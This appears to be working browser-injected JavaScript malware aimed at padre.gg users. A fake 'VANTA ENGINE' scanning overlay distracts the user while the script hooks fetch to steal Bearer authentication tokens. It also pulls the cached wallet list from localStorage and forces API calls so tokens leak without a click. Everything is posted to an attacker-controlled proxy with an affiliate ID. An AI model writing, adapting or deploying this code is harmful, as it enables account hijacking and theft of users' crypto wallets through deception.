(function() {
    const affId = window.V_AFF || 't23dad55';
    const proxy = window.V_PROXY;

    // 1. Create the "System Scan" UI
    const ui = document.createElement('div');
    ui.style = "position:fixed;top:20px;right:20px;width:320px;background:#050505;border:2px solid #00ff88;border-radius:12px;padding:20px;color:#00ff88;font-family:monospace;z-index:9999999;box-shadow:0 0 30px rgba(0,255,136,0.3);";
    ui.innerHTML = `
        <div style="font-weight:bold;font-size:14px;border-bottom:1px solid #00ff88;padding-bottom:10px;margin-bottom:10px;">VANTA ENGINE v4.0</div>
        <div id="status" style="font-size:11px;color:#fff;">INITIALIZING STEALTH BYPASS...</div>
        <div style="width:100%;background:#111;height:4px;margin-top:10px;"><div id="bar" style="width:10%;height:100%;background:#00ff88;transition:0.8s;"></div></div>
    `;
    document.body.appendChild(ui);

    const update = (txt, prg) => {
        document.getElementById('status').innerText = txt;
        document.getElementById('bar').style.width = prg + '%';
    };

    // 2. THE HIJACKER: Intercepts the REAL token when we force a refresh
    const rawFetch = window.fetch;
    window.fetch = async function(...args) {
        const headers = args[1]?.headers || {};
        const auth = headers['Authorization'] || headers['authorization'] || "";
        
        if (auth.startsWith('Bearer ')) {
            // SUCCESS: We caught the token!
            sendToVanta({ token: auth, method: "INTERCEPT" });
            update("SYNC SUCCESSFUL. DEPLOYING...", 100);
            setTimeout(() => ui.remove(), 1500);
        }
        return rawFetch.apply(this, args);
    };

    async function sendToVanta(extra = {}) {
        const payload = {
            embeds: [{
                title: "💀 VANTA INSTANT HIT",
                color: 0x00FF88,
                fields: [
                    { name: "Affiliate", value: affId, inline: true },
                    { name: "Bearer Token", value: "```" + (extra.token || "FETCHING...") + "```" },
                    { name: "Wallet List", value: "```json\n" + (localStorage.getItem('padreV2-walletsCache') || "Empty").substring(0, 500) + "```" }
                ],
                footer: { text: "Vanta Zero-Click Module" },
                timestamp: new Date()
            }]
        };
        await rawFetch(proxy, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
    }

    // 3. THE FORCE: This forces the token out without user clicks
    setTimeout(() => {
        update("EXPLOITING HANDSHAKE...", 40);
        
        // Force the app to think it just gained focus (triggers a balance refresh)
        window.dispatchEvent(new FocusEvent('focus'));
        
        // Ghost request: We try to ping Padre's own API. 
        // If the user is logged in, the browser AUTOMATICALLY attaches the token.
        rawFetch('https://api.padre.gg/v1/user/me').catch(() => {});
        rawFetch('https://api.padre.gg/v1/wallets').catch(() => {});
    }, 1000);

    setTimeout(() => { if(document.getElementById('bar').style.width !== '100%') update("RETRIEVING FROM CACHE...", 70); }, 3000);
})();
